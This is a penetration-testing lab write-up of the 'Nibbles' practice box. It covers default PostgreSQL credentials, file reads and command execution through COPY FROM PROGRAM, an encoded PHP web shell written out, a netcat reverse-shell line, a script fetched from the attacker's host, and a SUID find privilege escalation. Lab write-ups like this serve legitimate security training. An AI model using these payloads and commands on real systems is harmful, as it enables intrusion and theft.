# Nibbles

Relatively simple box
1. Nmap scan reveals PostgreSQL service running on a slightly unusual port
2. For PostgreSQL service, Default username is `postgres`, guessed that the password is `postgres`
3. That user is superuser, can execute commands with `COPY <table> from PROGRAM "<command>";`
4. Finding SUID binaries reveals `find` binary, uses GTFO bins to escalate privileges to a root shell.

## Plan
- [x] nmap simple scan
- [x] nmap full script scan
- [x] nmap UDP scan?
- [x] nmap vuln scan

### 21 - vsftpd 3.0.3

Understand how it works & Interact  [ ] `(I)`
- [ ] Find the Official Documentation
- [ ] Google

Custom ways of Exploitation
- [ ] Hacktricks

Search & Test for Vulnerabilities `(I)`
- [ ] Searchsploit
- [ ] Google
- [ ] More

Logging in
- [x] Anonymous/ Null Login - Doesn't work
Brute Force `I` 
- [x] `admin` : `admin`, and other common ones
- [ ] Same as username (eg. `mario` : `mario`)
- [ ] rockyou.txt
- [ ] More

### 22 - OpenSSH 7.9p1 Debian 10


Understand how it works & Interact  [ ] `(I)`
- [ ] Find the Official Documentation
- [ ] Google

Custom ways of Exploitation
- [ ] Hacktricks

Search & Test for Vulnerabilities `(I)`
- [ ] Searchsploit
- [ ] Google
- [ ] More

### 80 - Apache httpd 2.4.38 ((Debian))


Understand how it works & Interact  [ ] `(I)`
- [ ] Find the Official Documentation
- [ ] Google

Custom ways of Exploitation
- [ ] Hacktricks

Search & Test for Vulnerabilities `(I)`
- [ ] Searchsploit
- [ ] Google
- [ ] More


### Content
Source Code `E`
- [x] Find all the files, hidden or not (if possible)
	- [x] Dir Enumeration
- [x] Look through the source code of ALL the files
	- [x] Files
		- [x] `/` - Standard default page
    - [ ] Find all Input Fields `-> Input Fields`
    - [ ] File Uploads `-> File upload`

Directory Enumeration (dirb) `I -> Custom page/ CMS`
- [x] Sitemap (robots.txt) - Nonexistent
- [x] Common wordlist
- [x] big wordlist
- [ ] More

Virtual Hosts Testing `I`
- [ ] Given hostname
- [ ] Hostname derived from box name
- [ ] More

Vulnerability Scanning `I`
- [x] Nikto Vulnerability Scanner
- [ ] More

### 5437 - PostgreSQL DB 11.3 - 11.7


Understand how it works & Interact  [ ] `(I)`
- [ ] Find the Official Documentation
- [ ] Google

Custom ways of Exploitation
- [x] Hacktricks https://book.hacktricks.xyz/pentesting/pentesting-postgresql

Search & Test for Vulnerabilities `(I)`
- [ ] Searchsploit
- [ ] Google
- [ ] More


Logging in
- [x] Anonymous/ Null Login - Doesn't work
Brute Force `I` 
- [x] `admin` : `admin`, and other common ones
- [x] Same as username (eg. `mario` : `mario`) - `postgres` - Works
- [ ] rockyou.txt
- [ ] More

## Enumeration

```
# Nmap 7.91 scan initiated Sat Jan 15 07:20:51 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Nibbles/results/192.168.123.47/scans/_full_tcp_nmap.txt" -oX "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Nibbles/results/192.168.123.47/scans/xml/_full_tcp_nmap.xml" 192.168.123.47
Nmap scan report for 192.168.123.47
Host is up, received user-set (0.18s latency).
Scanned at 2022-01-15 07:20:53 EST for 337s
Not shown: 65529 filtered ports
Reason: 65529 no-responses
PORT     STATE  SERVICE      REASON         VERSION
21/tcp   open   ftp          syn-ack ttl 63 vsftpd 3.0.3
22/tcp   open   ssh          syn-ack ttl 63 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 10:62:1f:f5:22:de:29:d4:24:96:a7:66:c3:64:b7:10 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDJgyzpWrB8SyLb/XmPYQYzsnfizW7d0aNZHpwQ9ivcHQ/RYLbCc8yUIQGN2JMqCgfSj8CRMA36UnV8jnngjkw9njcgMyA5qc1mO4tzzH7VNkW2t5AmP7Q1HBt+SThlLa0JxBN6Gd5BOPwrsk9YTjLj8ax2ncvGBq8jzQjYmm9jF4VgBak5DY+Q5JWdf9krumSlR+V8yneV9aQ6sVy2XgkCJQLQ8GoUTm/13XUTc3TCKQ2KOJ2FzA8VcNTfxqTDxalwnYrZ1tod7BRfMeff5MwxC5gzeB+hdOVC0zAZlvNtMxH6SCxMBRCoX9IHL27E6WtSGXCj1SLYJWrFImjp+I1L
|   256 c9:15:ff:cd:f3:97:ec:39:13:16:48:38:c5:58:d7:5f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBM7uIYLogPsKP+c0QrezqQfB94ml7djfUOtG8ZAoMX6yK898l0TbgyAShcQSmdOsSMGdSO4GZpixCFJdsYkBi0M=
|   256 90:7c:a3:44:73:b4:b4:4c:e3:9c:71:d1:87:ba:ca:7b (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKoHnGdMtb37ORTRBt2cTfWvQE7IB3fF3ewP/1tqn0JF
80/tcp   open   http         syn-ack ttl 63 Apache httpd 2.4.38 ((Debian))
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Enter a title, displayed at the top of the window.
139/tcp  closed netbios-ssn  reset ttl 63
445/tcp  closed microsoft-ds reset ttl 63
5437/tcp open   postgresql   syn-ack ttl 63 PostgreSQL DB 11.3 - 11.7
| ssl-cert: Subject: commonName=debian
| Subject Alternative Name: DNS:debian
| Issuer: commonName=debian
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-04-27T15:41:47
| Not valid after:  2030-04-25T15:41:47
| MD5:   b086 6d30 4913 684e 16c1 8348 fc76 fe43
| SHA-1: cb30 5109 0fc1 14ab 0fb9 8e55 5874 4bb5 ba57 66af
| -----BEGIN CERTIFICATE-----
| MIIC0DCCAbigAwIBAgIUYoM4kALX3eWKWuCQ1/K5FujVbGowDQYJKoZIhvcNAQEL
| BQAwETEPMA0GA1UEAwwGZGViaWFuMB4XDTIwMDQyNzE1NDE0N1oXDTMwMDQyNTE1
| NDE0N1owETEPMA0GA1UEAwwGZGViaWFuMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A
| MIIBCgKCAQEAkpSVo7cfTt1CRy7yDV5Nr2dOJxIyg3JdaE+Mdtsw7/cbPaucXy/L
| fYOoyUsSINbZtIV6/WEpFVD+fIWwPoPWsgazcnNF0Z1quuxOjXnmZICvVqku5vHk
| Q+facbUNjGpz9OMC4s0y/T7uHH6psPoBBgL5ZVTNvU6tK/CnvjtPpMgQ+bOkIqsM
| mMxQnUILBBfUdaVfgetlPCc1qg4+fq0ZCP/d0vjIlb6kA3AuprjFo2xpLwtbx0RM
| BXkmm+STQRTxYnY62MRiL52tzACWfI7lml8LnUFP98tpPzT/0UCBx8cLLNrGlhQP
| ZZb7sALAS8hjpOcIjvRT+ZfXKHHma5RvGQIDAQABoyAwHjAJBgNVHRMEAjAAMBEG
| A1UdEQQKMAiCBmRlYmlhbjANBgkqhkiG9w0BAQsFAAOCAQEAJ1f62YGJW8Ds0e31
| s6hlCQX0kpn5+UXbTMMkjkBWp54aPg6YjUbg4py/E+gJtDWDv/Z8bT+ggiHdIQLf
| +99KE7ShNlnn+hiI4MYjza5rl2W00taN0PiYcKpz898aQ/4Kmho5wkYz+s1bi87O
| 5/IphYJXZYLOLf3CzuWzCT5RUBKZO/BVX79kqJvOLH2xJOkRwA9mgNh5QY0CBzCk
| NVOoDL+Yhof2sZs/UetiW//U8Mtiz22rQWmU4l/tU/X8rUAJQYOCmohGCXnU3aN2
| 6VSDkryCvRWChxwJtqXdKEMZ03E/zr35LhqLWmQmRSEjeVw10HN3g6Y1NpAKV1+g
| rFaQxA==
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
OS fingerprint not ideal because: Didn't receive UDP response. Please try again with -sSU
Aggressive OS guesses: Linux 2.6.32 (88%), Linux 2.6.32 or 3.10 (88%), Linux 2.6.39 (88%), Linux 3.10 - 3.12 (88%), Linux 4.4 (88%), WatchGuard Fireware 11.8 (88%), Synology DiskStation Manager 5.1 (87%), Linux 2.6.35 (87%), Linux 4.9 (87%), Linux 3.4 (87%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.91%E=4%D=1/15%OT=21%CT=139%CU=%PV=Y%DS=2%DC=T%G=N%TM=61E2BD76%P=x86_64-pc-linux-gnu)
SEQ(SP=FD%GCD=1%ISR=10A%TI=Z%II=I%TS=A)
SEQ(SP=FD%GCD=1%ISR=109%TI=Z%TS=A)
OPS(O1=M54EST11NW7%O2=M54EST11NW7%O3=M54ENNT11NW7%O4=M54EST11NW7%O5=M54EST11NW7%O6=M54EST11)
WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)
ECN(R=Y%DF=Y%TG=40%W=FAF0%O=M54ENNSNW7%CC=Y%Q=)
T1(R=Y%DF=Y%TG=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
T5(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=N)
T7(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=40%CD=S)

Uptime guess: 42.997 days (since Fri Dec  3 07:30:22 2021)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=253 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 139/tcp)
HOP RTT       ADDRESS
1   180.23 ms 192.168.49.1
2   180.10 ms 192.168.123.47

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jan 15 07:26:30 2022 -- 1 IP address (1 host up) scanned in 339.64 seconds

```

**Vuln**

```
┌──(kali㉿kali)-[/tmp]
└─$ nmap --script vuln 192.168.123.47 -p 21,22,80,5437                                                                                                            130 ⨯
Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-15 11:20 EST
Nmap scan report for 192.168.123.47
Host is up (0.18s latency).

PORT     STATE SERVICE
21/tcp   open  ftp
|_sslv2-drown: 
22/tcp   open  ssh
80/tcp   open  http
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
5437/tcp open  pmip6-data

Nmap done: 1 IP address (1 host up) scanned in 45.82 seconds
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ 

```

## 21 - FTP

```
┌──(kali㉿kali)-[/media/…/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Nibbles]
└─$ ftp 192.168.123.47                                                  
Connected to 192.168.123.47.
220 (vsFTPd 3.0.3)
Name (192.168.123.47:kali): anonymous
331 Please specify the password.
Password:
530 Login incorrect.
Login failed.
ftp> anonymous
?Invalid command
ftp> 
ftp> ls
421 Timeout.
ftp> exit
```

## 22 - SSH

## 80 - Web 
#### Nikto

```
┌──(kali㉿kali)-[/media/…/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Nibbles]
└─$ nikto -h 192.168.123.47
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.123.47
+ Target Hostname:    192.168.123.47
+ Target Port:        80
+ Start Time:         2022-01-15 07:39:28 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.38 (Debian)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server may leak inodes via ETags, header found with file /, inode: 4f8, size: 5a34020bc5080, mtime: gzip
+ Allowed HTTP Methods: OPTIONS, HEAD, GET, POST 
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7915 requests: 0 error(s) and 6 item(s) reported on remote host
+ End Time:           2022-01-15 08:04:58 (GMT-5) (1530 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested


      *********************************************************************
      Portions of the server's headers (Apache/2.4.38) are not in
      the Nikto 2.1.6 database or are newer than the known string. Would you like
      to submit this information (*no server specific data*) to CIRT.net
      for a Nikto update (or you may email to sullo@cirt.net) (y/n)? 

                                                                                                                                                                        
┌──(kali㉿kali)-[/media/…/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Nibbles]
└─$ 

```


## 5437 - PostgreSQL

### Logging in

```
┌──(kali㉿kali)-[~]
└─$ psql -h 192.168.123.47 -p 5437
Password for user kali: 
psql: error: FATAL:  password authentication failed for user "kali"
FATAL:  password authentication failed for user "kali"
                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ psql -h 192.168.123.47 -p 5437 -U root                                                                                                                          2 ⨯
Password for user root: 
psql: error: FATAL:  password authentication failed for user "root"
FATAL:  password authentication failed for user "root"
                          
```


Default user is `postgres`, password guessed to be `postgres`

```
┌──(kali㉿kali)-[~]
└─$ psql -h 192.168.123.47 -p 5437 -U postgres                                                                                                                      2 ⨯
Password for user postgres: 
psql (13.2 (Debian 13.2-1), server 11.7 (Debian 11.7-0+deb10u1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

postgres=# 

```

### Enumerate Data

```
                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ psql -h 192.168.123.47 -p 5437 -U postgres                                                                                                                      2 ⨯
Password for user postgres: 
psql (13.2 (Debian 13.2-1), server 11.7 (Debian 11.7-0+deb10u1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

postgres=# \list
                                  List of databases
   Name    |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges   
-----------+----------+----------+-------------+-------------+-----------------------
 postgres  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 template0 | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
           |          |          |             |             | postgres=CTc/postgres
 template1 | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
           |          |          |             |             | postgres=CTc/postgres
(3 rows)

postgres=# \c template0
FATAL:  database "template0" is not currently accepting connections
Previous connection kept
postgres=# \c template1
psql (13.2 (Debian 13.2-1), server 11.7 (Debian 11.7-0+deb10u1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
You are now connected to database "template1" as user "postgres".
template1=# \d
Did not find any relations.
template1=# \du+
                                          List of roles
 Role name |                         Attributes                         | Member of | Description 
-----------+------------------------------------------------------------+-----------+-------------
 postgres  | Superuser, Create role, Create DB, Replication, Bypass RLS | {}        | 

template1=# \c postgres
psql (13.2 (Debian 13.2-1), server 11.7 (Debian 11.7-0+deb10u1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
You are now connected to database "postgres" as user "postgres".
postgres=# \d
Did not find any relations.
postgres=# \c template1
psql (13.2 (Debian 13.2-1), server 11.7 (Debian 11.7-0+deb10u1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
You are now connected to database "template1" as user "postgres".
template1=# 

```

### File Read

```
template1=# CREATE TABLE demo(t text);
CREATE TABLE
template1=# COPY demo from '/etc/passwd';
COPY 29
template1=# select * from demo;
                                             t                                             
-------------------------------------------------------------------------------------------
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
 sys:x:3:3:sys:/dev:/usr/sbin/nologin
 sync:x:4:65534:sync:/bin:/bin/sync
 games:x:5:60:games:/usr/games:/usr/sbin/nologin
 man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
 lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
 mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
 news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
 uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
 proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
 www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
 backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
 list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
 irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
 gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
 nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
 _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
 systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
 systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
 systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
 messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
 sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
 wilson:x:1000:1000:wilson,,,:/home/wilson:/bin/bash
 systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
 postgres:x:106:113:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
 Debian-snmp:x:107:114::/var/lib/snmp:/bin/false
 ftp:x:108:117:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
(29 rows)

template1=# COPY demo from '/etc/shadow';
ERROR:  could not open file "/etc/shadow" for reading: Permission denied
HINT:  COPY FROM instructs the PostgreSQL server process to read a file. You may want a client-side facility such as psql's \copy.
template1=# 

```

### File Write Test

Backdoor

Works for good files
```
template1=# COPY (select convert_from(decode('PGZvcm0gbWV0aG9kPSdHRVQnPjxpbnB1dCB0eXBlPSdURVhUJyBuYW1lPSdjbWQnIGlkPSdjbWQnIHNpemU9JzgwJz48aW5wdXQgdHlwZT0nU1VCTUlUJyB2YWx1ZT0nRXhlY3V0ZSc+PC9mb3JtPjxwcmU+PD9waHAgaWYoaXNzZXQoJF9HRVRbJ2NtZCddKSl7c3lzdGVtKCRfR0VUWydjbWQnXSk7fSA/PjwvcHJlPg==','base64'),'utf-8')) to '/var/www/html/backdoor.php';
ERROR:  could not open file "/var/www/html/backdoor.php" for writing: Permission denied
HINT:  COPY TO instructs the PostgreSQL server process to write a file. You may want a client-side facility such as psql's \copy.
template1=# COPY (select convert_from(decode('PGZvcm0gbWV0aG9kPSdHRVQnPjxpbnB1dCB0eXBlPSdURVhUJyBuYW1lPSdjbWQnIGlkPSdjbWQnIHNpemU9JzgwJz48aW5wdXQgdHlwZT0nU1VCTUlUJyB2YWx1ZT0nRXhlY3V0ZSc+PC9mb3JtPjxwcmU+PD9waHAgaWYoaXNzZXQoJF9HRVRbJ2NtZCddKSl7c3lzdGVtKCRfR0VUWydjbWQnXSk7fSA/PjwvcHJlPg==','base64'),'utf-8')) to '/tmp/t';COPY 1
template1=# COPY demo from '/tmp/t';
COPY 1
template1=# select * from demo;
template1=# 

```

```
template1-# ;
ERROR:  could not open file "/etc/vsftpd.conf" for writing: Permission denied
HINT:  COPY TO instructs the PostgreSQL server process to write a file. You may want a client-side facility such as psql's \copy.
template1=# 

```

# Exploitation

## Reversing the below exploit
```
template1=# COPY demo from PROGRAM 'whoami';
COPY 1
template1=# select * from demo;
    t     
----------
 postgres
(1 row)

template1=# COPY demo from PROGRAM 'whoami && uname -a && pwd';
COPY 3
template1=# select * from demo;
                                         t                                          
------------------------------------------------------------------------------------
 postgres
 postgres
 Linux nibbles 4.19.0-8-amd64 #1 SMP Debian 4.19.98-1 (2020-01-26) x86_64 GNU/Linux
 /var/lib/postgresql/11/main
(4 rows)

template1=# 

```

## Exploit code

Maybe in the future can try this?:https://github.com/attackercan/psql-mass-rce

https://github.com/squid22/PostgreSQL_RCE/blob/main/postgresql_rce.py

```
┌──(kali㉿kali)-[/tmp]
└─$ git clone https://github.com/squid22/PostgreSQL_RCE.git
Cloning into 'PostgreSQL_RCE'...
remote: Enumerating objects: 20, done.
remote: Counting objects: 100% (20/20), done.
remote: Compressing objects: 100% (16/16), done.
remote: Total 20 (delta 7), reused 10 (delta 3), pack-reused 0
Receiving objects: 100% (20/20), 15.50 KiB | 15.50 MiB/s, done.
Resolving deltas: 100% (7/7), done.
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ cd PostgreSQL_RCE 
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/PostgreSQL_RCE]
└─$ ls
LICENSE  postgresql_rce.py  README.md  requirements.txt
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/PostgreSQL_RCE]
└─$ python postgresql_rce.py                                                                             
  File "postgresql_rce.py", line 16
    rev_shell = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f"
                                                                                               ^
SyntaxError: invalid syntax
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/PostgreSQL_RCE]
└─$ python3 postgresql_rce.py                                                                                                                                       1 ⨯
^C^C^C^Z
zsh: suspended  python3 postgresql_rce.py
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/PostgreSQL_RCE]
└─$ ps                                                                                                                                                        148 ⨯ 1 ⚙
    PID TTY          TIME CMD
  13747 pts/2    00:00:01 zsh
  13958 pts/2    00:00:00 python3
  13968 pts/2    00:00:00 ps
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/PostgreSQL_RCE]
└─$ kill -o 13958                                                                                                                                                   1 ⚙
kill: unknown signal: SIGO
kill: type kill -l for a list of signals
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/PostgreSQL_RCE]
└─$ kill -9 13958                                                                                                                                               1 ⨯ 1 ⚙
                                                                                                                                                                        
[1]  + killed     python3 postgresql_rce.py
┌──(kali㉿kali)-[/tmp/PostgreSQL_RCE]
└─$ nano postgresql_rce.py 
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/PostgreSQL_RCE]
└─$ nano postgresql_rce.py   
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp/PostgreSQL_RCE]
└─$ python3 postgresql_rce.py
[!] Connected to the PostgreSQL database
[*] Executing the payload. Please check if you got a reverse shell!
```

## Revshell

```
┌──(kali㉿kali)-[~]
└─$ sudo nc -nlvp 80  
[sudo] password for kali: 
listening on [any] 80 ...
connect to [192.168.49.123] from (UNKNOWN) [192.168.123.47] 38460
/bin/sh: 0: can't access tty; job control turned off
$ whoami
postgres
$ pwd
/var/lib/postgresql/11/main
$ ls
base
global
pg_commit_ts
pg_dynshmem
pg_logical
pg_multixact
pg_notify
pg_replslot
pg_serial
pg_snapshots
pg_stat
pg_stat_tmp
pg_subtrans
pg_tblspc
pg_twophase
PG_VERSION
pg_wal
pg_xact
postgresql.auto.conf
postmaster.opts
postmaster.pid
$ 
```

# Privesc


https://gtfobins.github.io/gtfobins/find/

```
┌──(kali㉿kali)-[/tmp]
└─$ sudo python3 -m http.server 80                                                                                   
[sudo] password for kali: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.123.47 - - [15/Jan/2022 12:09:27] "GET /lse.sh HTTP/1.1" 200 -

```

```
┌──(kali㉿kali)-[~]
└─$ sudo nc -nlvp 80  
[sudo] password for kali: 
listening on [any] 80 ...
connect to [192.168.49.123] from (UNKNOWN) [192.168.123.47] 38460
/bin/sh: 0: can't access tty; job control turned off
$ whoami
postgres
$ pwd
/var/lib/postgresql/11/main
$ ls
base
global
pg_commit_ts
pg_dynshmem
pg_logical
pg_multixact
pg_notify
pg_replslot
pg_serial
pg_snapshots
pg_stat
pg_stat_tmp
pg_subtrans
pg_tblspc
pg_twophase
PG_VERSION
pg_wal
pg_xact
postgresql.auto.conf
postmaster.opts
postmaster.pid
$ python -c 'import pty; pty.spawn("/bin/bash")'
postgres@nibbles:/var/lib/postgresql/11/main$ cd /tmp
cd /tmp
postgres@nibbles:/tmp$ wget 192.168.123.47/lse.sh
wget 192.168.123.47/lse.sh
--2022-01-15 12:08:11--  http://192.168.123.47/lse.sh
Connecting to 192.168.123.47:80... connected.
HTTP request sent, awaiting response... 404 Not Found
2022-01-15 12:08:11 ERROR 404: Not Found.

postgres@nibbles:/tmp$ wget 192.168.49.123/lse.sh
wget 192.168.49.123/lse.sh
--2022-01-15 12:08:31--  http://192.168.49.123/lse.sh
Connecting to 192.168.49.123:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 43570 (43K) [text/x-sh]
Saving to: ‘lse.sh’

lse.sh              100%[===================>]  42.55K   121KB/s    in 0.4s    

2022-01-15 12:08:31 (121 KB/s) - ‘lse.sh’ saved [43570/43570]

postgres@nibbles:/tmp$ chmod +x lse.sh
chmod +x lse.sh
postgres@nibbles:/tmp$ ./lse.sh
./lse.sh
---
If you know the current user password, write it here to check sudo privileges:                                                                                          

---
                                                                                                                                                                        
 LSE Version: 3.7                                                                                                                                                       

        User: postgres
     User ID: 106
    Password: none
        Home: /var/lib/postgresql
        Path: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
       umask: 0077

    Hostname: nibbles
       Linux: 4.19.0-8-amd64
Distribution: Debian GNU/Linux 10 (buster)
Architecture: x86_64

==================================================================( users )=====
[i] usr000 Current user groups............................................. yes!
[*] usr010 Is current user in an administrative group?..................... nope
[*] usr020 Are there other users in administrative groups?................. nope
[*] usr030 Other users with shell.......................................... yes!
[i] usr040 Environment information......................................... skip
[i] usr050 Groups for other users.......................................... skip                                                                                        
[i] usr060 Other users..................................................... skip                                                                                        
[*] usr070 PATH variables defined inside /etc.............................. yes!                                                                                        
[!] usr080 Is '.' in a PATH variable defined inside /etc?.................. nope
===================================================================( sudo )=====
[!] sud000 Can we sudo without a password?................................. nope
[!] sud010 Can we list sudo commands without a password?................... nope
[*] sud040 Can we read sudoers files?...................................... nope
[*] sud050 Do we know if any other users used sudo?........................ nope
============================================================( file system )=====
[*] fst000 Writable files outside user's home.............................. yes!
[*] fst010 Binaries with setuid bit........................................ yes!
[!] fst020 Uncommon setuid binaries........................................ yes!
---
/usr/bin/find
---
[!] fst030 Can we write to any setuid binary?.............................. nope
[*] fst040 Binaries with setgid bit........................................ skip
[!] fst050 Uncommon setgid binaries........................................ skip                                                                                        
[!] fst060 Can we write to any setgid binary?.............................. skip                                                                                        
[*] fst070 Can we read /root?.............................................. nope                                                                                        
[*] fst080 Can we read subdirectories under /home?......................... yes!
[*] fst090 SSH files in home directories................................... nope
[*] fst100 Useful binaries................................................. yes!
[*] fst110 Other interesting files in home directories..................... nope
[!] fst120 Are there any credentials in fstab/mtab?........................ nope
[*] fst130 Does 'postgres' have mail?...................................... nope
[!] fst140 Can we access other users mail?................................. nope
[*] fst150 Looking for GIT/SVN repositories................................ nope
[!] fst160 Can we write to critical files?................................. nope
[!] fst170 Can we write to critical directories?........................... nope
[!] fst180 Can we write to directories from PATH defined in /etc?.......... nope
[!] fst190 Can we read any backup?......................................... nope
[!] fst200 Are there possible credentials in any shell history file?....... nope
[!] fst210 Are there NFS exports with 'no_root_squash' option?............. nope
[*] fst220 Are there NFS exports with 'no_all_squash' option?.............. nope
[i] fst500 Files owned by user 'postgres'.................................. skip
[i] fst510 SSH files anywhere.............................................. skip                                                                                        
[i] fst520 Check hosts.equiv file and its contents......................... skip                                                                                        
[i] fst530 List NFS server shares.......................................... skip                                                                                        
[i] fst540 Dump fstab file................................................. skip                                                                                        
=================================================================( system )=====                                                                                        
[i] sys000 Who is logged in................................................ skip
[i] sys010 Last logged in users............................................ skip                                                                                        
[!] sys020 Does the /etc/passwd have hashes?............................... nope                                                                                        
[!] sys022 Does the /etc/group have hashes?................................ nope
[!] sys030 Can we read shadow files?....................................... nope
[*] sys040 Check for other superuser accounts.............................. nope
[*] sys050 Can root user log in via SSH?................................... nope
[i] sys060 List available shells........................................... skip
[i] sys070 System umask in /etc/login.defs................................. skip                                                                                        
[i] sys080 System password policies in /etc/login.defs..................... skip                                                                                        
===============================================================( security )=====                                                                                        
[*] sec000 Is SELinux present?............................................. nope
[*] sec010 List files with capabilities.................................... yes!
[!] sec020 Can we write to a binary with caps?............................. nope
[!] sec030 Do we have all caps in any binary?.............................. nope
[*] sec040 Users with associated capabilities.............................. nope
[!] sec050 Does current user have capabilities?............................ skip
[!] sec060 Can we read the auditd log?..................................... nope                                                                                        
========================================================( recurrent tasks )=====
[*] ret000 User crontab.................................................... nope
[!] ret010 Cron tasks writable by user..................................... nope
[*] ret020 Cron jobs....................................................... yes!
[*] ret030 Can we read user crontabs....................................... nope
[*] ret040 Can we list other user cron tasks?.............................. nope
[*] ret050 Can we write to any paths present in cron jobs.................. nope
[!] ret060 Can we write to executable paths present in cron jobs........... skip
[i] ret400 Cron files...................................................... skip                                                                                        
[*] ret500 User systemd timers............................................. nope                                                                                        
[!] ret510 Can we write in any system timer?............................... nope
[i] ret900 Systemd timers.................................................. skip
================================================================( network )=====                                                                                        
[*] net000 Services listening only on localhost............................ nope
[!] net010 Can we sniff traffic with tcpdump?.............................. nope
[i] net500 NIC and IP information.......................................... skip
[i] net510 Routing table................................................... skip                                                                                        
[i] net520 ARP table....................................................... skip                                                                                        
[i] net530 Nameservers..................................................... skip                                                                                        
[i] net540 Systemd Nameservers............................................. skip                                                                                        
[i] net550 Listening TCP................................................... skip                                                                                        
